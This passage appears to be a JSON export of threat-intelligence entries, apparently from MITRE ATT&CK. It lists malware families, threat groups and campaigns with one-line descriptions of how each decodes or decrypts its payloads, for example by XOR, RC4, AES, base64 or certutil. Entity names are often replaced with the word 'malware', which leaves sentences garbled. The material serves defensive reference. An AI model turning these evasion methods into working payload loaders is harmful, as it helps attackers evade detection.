                "ID": "G0007",
                "Name": "APT28",
                "Description": "An malware macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.[11][12]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used malware to decrypt encrypted CAB files.[13]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to decrypt the loader configuration and payload DLL.[14]"
            },
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware uses a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and to hide its code. [15][16]"
            },
            "S0347": {
                "ID": "S0347",
                "Name": "AuditCred",
                "Description": "malware uses XOR and RC4 to perform decryption on the code functions.[17]"
            },
            "S0640": {
                "ID": "S0640",
                "Name": "Avaddon",
                "Description": "malware has decrypted encrypted strings.[18]"
            },
            "S0473": {
                "ID": "S0473",
                "Name": "Avenger",
                "Description": "malware has the ability to decrypt files downloaded from C2.[4]"
            },
            "S1053": {
                "ID": "S1053",
                "Name": "AvosLocker",
                "Description": "malware has deobfuscated XOR-encoded strings.[19]"
            },
            "S0344": {
                "ID": "S0344",
                "Name": "Azorult",
                "Description": "malware uses an XOR key to decrypt content and uses Base64 to decode the C2 address.[20][21]"
            },
            "S0638": {
                "ID": "S0638",
                "Name": "Babuk",
                "Description": "malware has the ability to unpack itself into memory using XOR.[22][23]"
            },
            "S0414": {
                "ID": "S0414",
                "Name": "BabyShark",
                "Description": "malware has the ability to decode downloaded files prior to execution.[24]"
            },
            "S0475": {
                "ID": "S0475",
                "Name": "BackConfig",
                "Description": "malware has used a custom routine to decrypt strings.[25]"
            },
            "S0642": {
                "ID": "S0642",
                "Name": "BADFLICK",
                "Description": "malware can decode shellcode using a custom rotating XOR cipher.[26]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware has decoded its PowerShell script.[27]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware decodes embedded XOR strings.[28]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can decrypt downloaded payloads. malware also resolves strings and other artifacts at runtime.[29][30]"
            },
            "S0470": {
                "ID": "S0470",
                "Name": "BBK",
                "Description": "malware has the ability to decrypt AES encrypted payloads.[4]"
            },
            "S0127": {
                "ID": "S0127",
                "Name": "BBSRAT",
                "Description": "malware uses Expand to decompress a CAB file into executable content.[31]"
            },
            "S0574": {
                "ID": "S0574",
                "Name": "BendyBear",
                "Description": "malware has decrypted function blocks using a XOR key during runtime to evade detection.[32]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware has decoded strings in the malware using XOR and RC4.[33][34]"
            },
            "S0520": {
                "ID": "S0520",
                "Name": "BLINDINGCAN",
                "Description": "malware has used AES and XOR to decrypt its DLLs.[35]"
            },
            "S0635": {
                "ID": "S0635",
                "Name": "BoomBox",
                "Description": "malware can decrypt AES-encrypted files downloaded from C2.[36]"
            },
            "S0415": {
                "ID": "S0415",
                "Name": "BOOSTWRITE",
                "Description": "malware has used a a 32-byte long multi-XOR key to decode data inside its payload.[37]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware downloads encoded payloads and decodes them on the victim.[38]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware has the ability to deobfuscate its payload prior to execution.[39]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can deobfuscate C2 server responses and unpack its code on targeted hosts.[40][41]"
            },
            "S0482": {
                "ID": "S0482",
                "Name": "Bundlore",
                "Description": "malware has used openssl to decrypt AES encrypted payload data. malware has also used base64 and RC4 with a hardcoded key to deobfuscate data.[42]"
            },
            "S1118": {
                "ID": "S1118",
                "Name": "BUSHWALK",
                "Description": "malware can Base64 decode and RC4 decrypt malicious payloads sent through a web request\u2019s command parameter.[43][44]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 used the DUSTPAN loader to decrypt embedded payloads.[45]"
            },
            "C0021": {
                "ID": "C0021",
                "Name": "C0021",
                "Description": "During malware, the threat actors deobfuscated encoded PowerShell commands including use of the specific string 'FromBase'+0x40+'String', in place of FromBase64String which is normally used to decode base64.[46][47]"
            },
            "S0335": {
                "ID": "S0335",
                "Name": "Carbon",
                "Description": "malware decrypts task and configuration files for execution.[48][49]"
            },
            "S0348": {
                "ID": "S0348",
                "Name": "Cardinal RAT",
                "Description": "malware decodes many of its artifacts and is decrypted (AES-128) after being downloaded.[50]"
            },
            "S0160": {
                "ID": "S0160",
                "Name": "certutil",
                "Description": "malware has been used to decode binaries hidden inside certificate files as Base64 information.[1]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware has decrypted an AES encrypted binary file to trigger the download of other files.[51]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware can decrypt downloaded modules prior to execution.[52]"
            },
            "S1041": {
                "ID": "S1041",
                "Name": "Chinoxy",
                "Description": "The malware dropping function can initiate decryption of its config file.[53]"
            },
            "S0667": {
                "ID": "S0667",
                "Name": "Chrommme",
                "Description": "malware can decrypt its encrypted internal code.[54]"
            },
            "G1021": {
                "ID": "G1021",
                "Name": "Cinnamon Tempest",
                "Description": "malware has used weaponized DLLs to load and decrypt payloads.[55]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware can deobfuscate its payload prior to execution.[56][57]"
            },
            "S0611": {
                "ID": "S0611",
                "Name": "Clop",
                "Description": "malware has used a simple XOR operation to decrypt strings.[58]"
            },
            "S1105": {
                "ID": "S1105",
                "Name": "COATHANGER",
                "Description": "malware decodes configuration items from a bundled file for command and control activity.[59]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can deobfuscate shellcode using a rolling XOR and decrypt metadata from Beacon sessions.[60][61]"
            },
            "S0369": {
                "ID": "S0369",
                "Name": "CoinTicker",
                "Description": "malware decodes the initially-downloaded hidden encoded file using OpenSSL.[62]"
            },
            "S0126": {
                "ID": "S0126",
                "Name": "ComRAT",
                "Description": "malware has used unique per machine passwords to decrypt the orchestrator payload and a hardcoded XOR key to decrypt its communications module. malware has also used a unique password to decrypt the file used for its hidden file system.[63][64]"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware has decrypted its payload using a hardcoded AES-256 key.[65][66]"
            },
            "S0492": {
                "ID": "S0492",
                "Name": "CookieMiner",
                "Description": "malware has used Google Chrome's decryption and extraction operations.[67]"
            },
            "S0614": {
                "ID": "S0614",
                "Name": "CostaBricks",
                "Description": "malware has the ability to use bytecode to decrypt embedded payloads.[68]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware can decode its encoded PE file prior to execution.[69]"
            },
            "S0687": {
                "ID": "S0687",
                "Name": "Cyclops Blink",
                "Description": "malware can decrypt and parse instructions sent from C2.[70]"
            },
            "S1014": {
                "ID": "S1014",
                "Name": "DanBot",
                "Description": "malware can use a VBA macro to decode its payload prior to installation and execution.[71]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware installation includes binary code stored in a file located in a hidden directory, such as shell.txt, that is decrypted then executed.[72] malware uses hexadecimal-encoded shellcode payloads during installation that are called via Windows API CallWindowProc() to decode and then execute.[73]"
            },
            "G0012": {
                "ID": "G0012",
                "Name": "Darkhotel",
                "Description": "malware has decrypted strings and imports using RC4 during execution.[74][75]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware can decrypt its payload and associated configuration elements using the Rijndael cipher.[76]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware has the ability to self-extract as a RAR archive.[77]"
            },
            "S0255": {
                "ID": "S0255",
                "Name": "DDKONG",
                "Description": "malware decodes an embedded configuration using XOR.[78]"
            },
            "S1052": {
                "ID": "S1052",
                "Name": "DEADEYE",
                "Description": "malware has the ability to combine multiple sections of a binary which were broken up to evade detection into a single .dll prior to execution.[45]"
            },
            "S0354": {
                "ID": "S0354",
                "Name": "Denis",
                "Description": "malware will decrypt important strings used for C&C communication.[79]"
            },
            "S0547": {
                "ID": "S0547",
                "Name": "DropBook",
                "Description": "malware can unarchive data downloaded from the C2 to obtain the payload and persistence modules.[80]"
            },
            "S0502": {
                "ID": "S0502",
                "Name": "Drovorub",
                "Description": "malware has de-obsfuscated XOR encrypted payloads in WebSocket messages.[81]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware has used a decryption routine that is part of an executable physical patch.[82]"
            },
            "S0024": {
                "ID": "S0024",
                "Name": "Dyre",
                "Description": "malware decrypts resources needed for targeting the victim.[83][84]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware has used certutil to decode a string into a cabinet file.[85]"
            },
            "S0377": {
                "ID": "S0377",
                "Name": "Ebury",
                "Description": "malware has verified C2 domain ownership by decrypting the TXT record using an embedded RSA public key.[86]"
            },
            "S0624": {
                "ID": "S0624",
                "Name": "Ecipekac",
                "Description": "malware has the ability to decrypt fileless loader modules.[87]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware has been decrypted before execution.[88][89]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has used a self-extracting RAR file to deliver modules to victims. malware has also extracted embedded executables from files using hard-coded buffer offsets.[90]"
            },
            "S0634": {
                "ID": "S0634",
                "Name": "EnvyScout",
                "Description": "malware can deobfuscate and write malicious ISO files to disk.[36]"
            },
            "S0401": {
                "ID": "S0401",
                "Name": "Exaramel for Linux",
                "Description": "malware can decrypt its configuration file.[91]"
            },
            "S0361": {
                "ID": "S0361",
                "Name": "Expand",
                "Description": "malware can be used to decompress a local or remote CAB file into an executable.[92]"
            },
            "S0512": {
                "ID": "S0512",
                "Name": "FatDuke",
                "Description": "malware can decrypt AES encrypted C2 communications.[93]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has utilized certutil to decode base64 encoded versions of custom malware.[94]"
            },
            "S0355": {
                "ID": "S0355",
                "Name": "Final1stspy",
                "Description": "malware uses Python code to deobfuscate base64-encoded strings.[95]"
            },
            "S0182": {
                "ID": "S0182",
                "Name": "FinFisher",
                "Description": "malware extracts and decrypts stage 3 malware, which is stored in encrypted resources.[96][97]"
            },
            "S0618": {
                "ID": "S0618",
                "Name": "FIVEHANDS",
                "Description": "malware has the ability to decrypt its payload prior to execution.[98][99][100]"
            },
            "S0661": {
                "ID": "S0661",
                "Name": "FoggyWeb",
                "Description": "malware can be decrypted in memory using a Lightweight Encryption Algorithm (LEA)-128 key and decoded using a XOR key.[101]"
            },
            "S1120": {
                "ID": "S1120",
                "Name": "FRAMESTING",
                "Description": "malware can decompress data received within POST requests.[43]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors deobfuscated Base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload.[102]"
            },
            "S0628": {
                "ID": "S0628",
                "Name": "FYAnti",
                "Description": "malware has the ability to decrypt an embedded .NET module.[87]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware tools decrypted additional payloads from the C2. malware has also decoded base64-encoded source code of a downloader.[103][104]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can decompress and decrypt DLLs and shellcode.[54]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware has decrypted and loaded the malware DLL into memory, once the initial dropper executable is launched.[105]"
            },
            "S1117": {
                "ID": "S1117",
                "Name": "GLASSTOKEN",
                "Description": "malware has the ability to decode hexadecimal and Base64 C2 requests.[106]"
            },
            "S0588": {
                "ID": "S0588",
                "Name": "GoldMax",
                "Description": "malware has decoded and decrypted the configuration file when executed.[107][108]"
            },
            "S0477": {
                "ID": "S0477",
                "Name": "Goopy",
                "Description": "malware has used a polymorphic decryptor to decrypt itself at runtime.[79]"
            },
            "G0078": {
                "ID": "G0078",
                "Name": "Gorgon Group",
                "Description": "malware malware can decode contents from a payload that was Base64 encoded and write the contents to a file.[109]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can decrypt its encrypted internal strings.[110]"
            },
            "S0690": {
                "ID": "S0690",
                "Name": "Green Lambert",
                "Description": "malware can use multiple custom routines to decrypt strings prior to execution.[111][112]"
            },
            "S0632": {
                "ID": "S0632",
                "Name": "GrimAgent",
                "Description": "malware can use a decryption algorithm for strings based on Rotate on Right (RoR) and Rotate on Left (RoL) functionality.[113]"
            },
            "S0499": {
                "ID": "S0499",
                "Name": "Hancitor",
                "Description": "malware has decoded Base64 encoded URLs to insert a recipient\u2019s name into the filename of the Word document. malware has also extracted executables from ZIP files.[114][115]"
            },
            "S0697": {
                "ID": "S0697",
                "Name": "HermeticWiper",
                "Description": "malware can decompress and copy driver files using LZCopy.[116]"
            },
            "S1027": {
                "ID": "S1027",
                "Name": "Heyoka Backdoor",
                "Description": "malware can decrypt its payload prior to execution.[117]"
            },
            "S0394": {
                "ID": "S0394",
                "Name": "HiddenWasp",
                "Description": "malware uses a cipher to implement a decoding function.[118]"
            },
            "G0126": {
                "ID": "G0126",
                "Name": "Higaisa",
                "Description": "malware used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data.[119][120]"
            },
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware has decrypted ELF files with AES.[121]"
            },
            "S1097": {
                "ID": "S1097",
                "Name": "HUI Loader",
                "Description": "malware can decrypt and load files containing malicious payloads.[122]"
            },
            "S0398": {
                "ID": "S0398",
                "Name": "HyperBro",
                "Description": "malware can unpack and decrypt its payload prior to execution.[56][123]"
            },
            "S1022": {
                "ID": "S1022",
                "Name": "IceApple",
                "Description": "malware can use a Base64-encoded AES key to decrypt tasking.[124]"
            },
            "S0434": {
                "ID": "S0434",
                "Name": "Imminent Monitor",
                "Description": "malware has decoded malware components that are then dropped to the system.[125]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware decrypts code to connect to a remote C2 server.[126]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can decrypt, unpack and load a DLL from its resources, or from blobs encrypted with Data Protection API, two-key triple DES, and variations of the XOR cipher.[127][128]"
            },
            "S0581": {
                "ID": "S0581",
                "Name": "IronNetInjector",
                "Description": "malware has the ability to decrypt embedded .NET and PE payloads.[129]"
            },
            "S0189": {
                "ID": "S0189",
                "Name": "ISMInjector",
                "Description": "malware uses the certutil command to decode a payload file.[130]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware has deobfuscated Base64-encoded shellcode strings prior to loading them.[131]"
            },
            "S0585": {
                "ID": "S0585",
                "Name": "Kerrdown",
                "Description": "malware can decode, decrypt, and decompress multiple layers of shellcode.[132]"
            },
            "S0487": {
                "ID": "S0487",
                "Name": "Kessel",
                "Description": "malware has decrypted the binary's configuration once the main function was launched.[133]"
            },
            "S1051": {
                "ID": "S1051",
                "Name": "KEYPLUG",
                "Description": "malware can decode its configuration file to determine C2 protocols.[45]"
            },
            "S0526": {
                "ID": "S0526",
                "Name": "KGH_SPY",
                "Description": "malware can decrypt encrypted strings and write them to a newly created folder.[134]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has decoded malicious VBScripts using Base64.[135]"
            },
            "S0641": {
                "ID": "S0641",
                "Name": "Kobalos",
                "Description": "malware decrypts strings right after the initial communication, but before the authentication process.[136]"
            },
            "S0669": {
                "ID": "S0669",
                "Name": "KOCTOPUS",
                "Description": "malware has deobfuscated itself before executing its commands.[137]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware has used certutil to download and decode base64 encoded strings and has also devoted a custom section to performing all the components of the deobfuscation process.[138][139]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware decrypts and extracts a copy of its main DLL payload when executing.[140]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime.[141][142]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.[143]"
            },
            "S0395": {
                "ID": "S0395",
                "Name": "LightNeuron",
                "Description": "malware has used AES and XOR to decrypt configuration files and commands.[144]"
            },
            "S1119": {
                "ID": "S1119",
                "Name": "LIGHTWIRE",
                "Description": "malware can RC4 decrypt and Base64 decode C2 commands.[43]"
            },
            "S0513": {
                "ID": "S0513",
                "Name": "LiteDuke",
                "Description": "malware has the ability to decrypt and decode multiple layers of obfuscation.[93]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware can decrypt its configuration data.[145]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware has decoded and decrypted its stages multiple times using hard-coded keys to deliver the final payload, and has decoded its server response hex string using XOR.[146]"
            },
            "S0582": {
                "ID": "S0582",
                "Name": "LookBack",
                "Description": "malware has a function that decrypts malicious data.[147]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can decrypt its C2 address upon execution.[148]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware\u2019s downloaded data is decrypted using AES.[149]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware decrypts a downloaded file using AES-128-EBC with a custom delta.[150]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can decrypt files and data.[151]"
            },
            "G1026": {
                "ID": "G1026",
                "Name": "Malteiro",
                "Description": "malware has the ability to deobfuscate downloaded files prior to execution.[152]"
            },
            "S0576": {
                "ID": "S0576",
                "Name": "MegaCortex",
                "Description": "malware has used a Base64 key to decode its components.[153]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used certutil -decode to decode files on the victim\u2019s machine when dropping UPPERCUT.[154][155]"
            },
            "S0443": {
                "ID": "S0443",
                "Name": "MESSAGETAP",
                "Description": "After checking for the existence of two files, keyword_parm.txt and parm.txt, malware XOR decodes and read the contents of the files. [156]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can decrypt and load other modules.[151]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "Upon execution, malware has unzipped itself after being downloaded to the system and has performed string decryption.[157][158][159]"
            },
            "S0280": {
                "ID": "S0280",
                "Name": "MirageFox",
                "Description": "malware has a function for decrypting data containing C2 configuration information.[160]"
            },
            "S1122": {
                "ID": "S1122",
                "Name": "Mispadu",
                "Description": "malware decrypts its encrypted configuration files prior to execution.[152][161]"
            },
            "G0021": {
                "ID": "G0021",
                "Name": "Molerats",
                "Description": "malware decompresses ZIP files once on the victim machine.[162]"
            },
            "S1026": {
                "ID": "S1026",
                "Name": "Mongall",
                "Description": "malware has the ability to decrypt its payload prior to execution.[117]"
            },
            "S0284": {
                "ID": "S0284",
                "Name": "More_eggs",
                "Description": "malware will decode malware components that are then dropped to the system.[163]"
            },
            "S1047": {
                "ID": "S1047",
                "Name": "Mori",
                "Description": "malware can resolve networking APIs from strings that are ADD-encrypted.[164]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has decoded base64-encoded PowerShell, JavaScript, and VBScript.[165][166][167][168]"
            },
            "S0637": {
                "ID": "S0637",
                "Name": "NativeZone",
                "Description": "malware can decrypt and decode embedded  Cobalt Strike beacon stage shellcode.[36]"
            },
            "S0457": {
                "ID": "S0457",
                "Name": "Netwalker",
                "Description": "malware's PowerShell script can decode and decrypt multiple layers of obfuscation, leading to the malware DLL being loaded into memory.[169]"
            },
            "S1100": {
                "ID": "S1100",
                "Name": "Ninja",
                "Description": "The malware loader component can decrypt and decompress the payload.[170][171]"
            },
            "S0353": {
                "ID": "S0353",
                "Name": "NOKKI",
                "Description": "malware uses a unique, custom de-obfuscation technique.[172]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "A malware macro has run a PowerShell command to decode file contents. malware has also used certutil to decode base64-encoded files on victims.[173][130][174][175]"
            },
            "S0439": {
                "ID": "S0439",
                "Name": "Okrum",
                "Description": "malware's loader can decrypt the backdoor code, embedded within the loader or within a legitimate PNG file. A custom XOR cipher or RC4 is used for decryption.[176]"
            },
            "S0052": {
                "ID": "S0052",
                "Name": "OnionDuke",
                "Description": "malware can use a custom decryption algorithm to decrypt strings.[93]"
            },
            "S0264": {
                "ID": "S0264",
                "Name": "OopsIE",
                "Description": "malware concatenates then decompresses multiple resources to load an embedded .Net Framework assembly.[174]"
            },
            "C0016": {
                "ID": "C0016",
                "Name": "Operation Dust Storm",
                "Description": "During malware, attackers used VBS code to decode payloads.[177]"
            },
            "C0006": {
                "ID": "C0006",
                "Name": "Operation Honeybee",
                "Description": "During malware, malicious files were decoded prior to execution.[178]"
            },
            "C0005": {
                "ID": "C0005",
                "Name": "Operation Spalax",
                "Description": "For malware, the threat actors used a variety of packers and droppers to decrypt malicious payloads.[179]"
            },
            "S0402": {
                "ID": "S0402",
                "Name": "OSX/Shlayer",
                "Description": "malware can base64-decode and AES-decrypt downloaded payloads.[180] Versions of malware pass encrypted and password-protected code to openssl and then write the payload to the /tmp folder.[181][182]"
            },
            "S0352": {
                "ID": "S0352",
                "Name": "OSX_OCEANLOTUS.D",
                "Description": "malware uses a decode routine combining bit shifting and XOR operations with a variable key that depends on the length of the string that was encoded. If the computation for the variable XOR key turns out to be 0, the default XOR key of 0x1B is used. This routine is also referenced as the rotate function in reporting.[183]"
            },
            "S0598": {
                "ID": "S0598",
                "Name": "P.A.S. Webshell",
                "Description": "malware can use a decryption mechanism to process a user supplied password and allow execution.[91]"
            },
            "S1050": {
                "ID": "S1050",
                "Name": "PcShare",
                "Description": "malware has decrypted its strings by applying a XOR operation and a decompression using a custom implemented LZM algorithm.[53]"
            },
            "S0517": {
                "ID": "S0517",
                "Name": "Pillowmint",
                "Description": "malware has been decompressed by included shellcode prior to being launched.[184]"
            },
            "S1031": {
                "ID": "S1031",
                "Name": "PingPull",
                "Description": "malware can decrypt received data from its C2 server by using AES.[185]"
            },
            "S0501": {
                "ID": "S0501",
                "Name": "PipeMon",
                "Description": "malware can decrypt password-protected executables.[186]"
            },
            "S1123": {
                "ID": "S1123",
                "Name": "PITSTOP",
                "Description": "malware can deobfuscate base64 encoded and AES encrypted commands.[44]"
            },
            "S0013": {
                "ID": "S0013",
                "Name": "PlugX",
                "Description": "malware decompresses and decrypts itself using the Microsoft API call RtlDecompressBuffer.[187][56][188]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware has used LZMA and base64 libraries to decode obfuscated scripts.[189]"
            },
            "S0518": {
                "ID": "S0518",
                "Name": "PolyglotDuke",
                "Description": "malware can use a custom algorithm to decrypt strings used by the malware.[93]"
            },
            "S1012": {
                "ID": "S1012",
                "Name": "PowerLess",
                "Description": "malware can use base64 and AES ECB decryption prior to execution of downloaded modules.[190]"
            },
            "S0223": {
                "ID": "S0223",
                "Name": "POWERSTATS",
                "Description": "malware can deobfuscate the main backdoor code.[167]"
            },
            "S1046": {
                "ID": "S1046",
                "Name": "PowGoop",
                "Description": "malware can decrypt PowerShell scripts for execution.[164][191]"
            },
            "S0279": {
                "ID": "S0279",
                "Name": "Proton",
                "Description": "malware uses an encrypted file to store commands and configuration values.[192]"
            },
            "S0613": {
                "ID": "S0613",
                "Name": "PS1",
                "Description": "malware can use an XOR key to decrypt a PowerShell loader and payload binary.[68]"
            },
            "S0147": {
                "ID": "S0147",
                "Name": "Pteranodon",
                "Description": "malware can decrypt encrypted data strings prior to using them.[193]"
            },
            "S0196": {
                "ID": "S0196",
                "Name": "PUNCHBUGGY",
                "Description": "malware has used PowerShell to decode base64-encoded assembly.[194]"
            },
            "S1032": {
                "ID": "S1032",
                "Name": "PyDCrypt",
                "Description": "malware has decrypted and dropped the DCSrv payload to disk.[195]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can deobfuscate and re-assemble code strings for execution.[196][197][198]"
            },
            "S0269": {
                "ID": "S0269",
                "Name": "QUADAGENT",
                "Description": "malware uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.[199]"
            },
            "S1076": {
                "ID": "S1076",
                "Name": "QUIETCANARY",
                "Description": "malware can use a custom parsing routine to decode the command codes and additional parameters from the C2 before executing them.[200]"
            },
            "S0565": {
                "ID": "S0565",
                "Name": "Raindrop",
                "Description": "malware decrypted its Cobalt Strike payload using an AES-256 encryption algorithm in CBC mode with a unique key per sample.[201][202]"
            },
            "S0629": {
                "ID": "S0629",
                "Name": "RainyDay",
                "Description": "malware can decrypt its payload via a XOR key.[203]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can extract its agent from the body of a malicious document.[204]"
            },
            "S1113": {
                "ID": "S1113",
                "Name": "RAPIDPULSE",
                "Description": "malware listens for specific HTTP query parameters in received communications. If specific parameters match, a hard-coded RC4 key is used to decrypt the HTTP query paremter hmacTime. This decrypts to a filename that is then open, read, encrypted with the same RC4 key, base64-encoded, written to standard out, then passed as a response to the HTTP request.[205]"
            },
            "S0495": {
                "ID": "S0495",
                "Name": "RDAT",
                "Description": "malware can deobfuscate the base64-encoded and AES-encrypted files downloaded from the C2 server.[206]"
            },
            "S0511": {
                "ID": "S0511",
                "Name": "RegDuke",
                "Description": "malware can decrypt strings with a key either stored in the Registry or hardcoded in the code.[93]"
            },
            "S0375": {
                "ID": "S0375",
                "Name": "Remexi",
                "Description": "malware decrypts the configuration data using XOR with 25-character keys.[207]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware can decode encrypted strings to enable execution of commands and payloads.[208][209][210][211][212][213]"
            },
            "S0258": {
                "ID": "S0258",
                "Name": "RGDoor",
                "Description": "malware decodes Base64 strings and decrypts strings using a custom XOR algorithm.[214]"
            },
            "S0448": {
                "ID": "S0448",
                "Name": "Rising Sun",
                "Description": "malware has decrypted itself using a single-byte XOR scheme. Additionally, malware can decrypt its configuration data at runtime.[215]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware has extracted tar.gz files after downloading them from a C2 server.[216]"
            },
            "S0270": {
                "ID": "S0270",
                "Name": "RogueRobin",
                "Description": "malware decodes an embedded executable using base64 and decompresses it.[217]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can decrypt strings using the victim's hostname as the key.[218][219]"
            },
            "S1078": {
                "ID": "S1078",
                "Name": "RotaJakiro",
                "Description": "malware uses the AES algorithm, bit shifts in a function called rotate, and an XOR cipher to decrypt resources required for persistence, process guarding, and file locking. It also performs this same function on encrypted stack strings and the head and key sections in the network packet structure used for C2 communications.[220]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware can deobfuscate strings and files for execution.[221]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware's VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.[222][223]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware can first decrypt with the RC4 algorithm using a hardcoded decryption key before decompressing.[224]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has the ability to decrypt and decompress its payload to enable code execution.[225][226]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware has decrypted a binary blob to start execution.[227]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "malware decrypts ciphertext using an XOR cipher and a base64-encoded string.[228]"
            },
            "S1019": {
                "ID": "S1019",
                "Name": "Shark",
                "Description": "malware can extract and decrypt downloaded .zip files.[229]"
            },
            "S0546": {
                "ID": "S0546",
                "Name": "SharpStage",
                "Description": "malware has decompressed data received from the C2 server.[230]"
            },
            "S0444": {
                "ID": "S0444",
                "Name": "ShimRat",
                "Description": "malware has decompressed its core DLL using shellcode once an impersonated antivirus component was running on a system.[231]"
            },
            "S0589": {
                "ID": "S0589",
                "Name": "Sibot",
                "Description": "malware can decrypt data received from a C2 and save to a file.[107]"
            },
            "S0610": {
                "ID": "S0610",
                "Name": "SideTwist",
                "Description": "malware can decode and decrypt messages received from C2.[232]"
            },
            "S0623": {
                "ID": "S0623",
                "Name": "Siloscape",
                "Description": "malware has decrypted the password of the C2 server with a simple byte by byte XOR. malware also writes both an archive of Tor and the unzip binary to disk from data embedded within the payload using Visual Studio\u2019s Resource Manager.[233]"
            },
            "S0468": {
                "ID": "S0468",
                "Name": "Skidmap",
                "Description": "malware has the ability to download, unpack, and decrypt tar.gz files .[234]"
            },
            "S1110": {
                "ID": "S1110",
                "Name": "SLIGHTPULSE",
                "Description": "malware can deobfuscate base64 encoded and RC4 encrypted C2 messages.[235]"
            },
            "S0226": {
                "ID": "S0226",
                "Name": "Smoke Loader",
